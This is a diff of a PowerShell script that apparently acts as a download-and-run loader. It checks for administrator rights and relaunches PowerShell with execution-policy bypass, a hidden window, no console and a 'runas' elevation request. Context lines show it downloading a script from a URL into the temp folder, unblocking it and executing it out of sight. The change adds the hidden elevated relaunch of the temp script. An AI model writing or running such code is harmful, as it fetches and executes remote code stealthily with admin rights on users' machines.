@@ -2,9 +2,20 @@ $Elevation = [System.Security.Principal.WindowsPrincipal][System.Security.Princi
 $AdminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
 
 if (-not $Elevation.IsInRole($AdminRole)) {
-    # Relaunch the script as Administrator with hidden window and bypass execution policy
-    $arguments = "-ExecutionPolicy Bypass -File '" + $myinvocation.MyCommand.Definition + "'"
-    Start-Process powershell -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden
+    
+    $scriptPath = "$env:TEMP\1.ps1"
+
+    $psPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = $psPath
+    $psi.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
+    $psi.WindowStyle = 'Hidden'
+    $psi.CreateNoWindow = $true
+    $psi.UseShellExecute = $false
+    $psi.Verb = "runas"
+
+    [System.Diagnostics.Process]::Start($psi)
     exit
 }
 
@@ -22,8 +33,6 @@ $wc.DownloadFile($url, $scriptPath)
 Unblock-File -Path $scriptPath
 
 $psPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
-
-Unblock-File -Path $scriptPath
 
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = $psPath
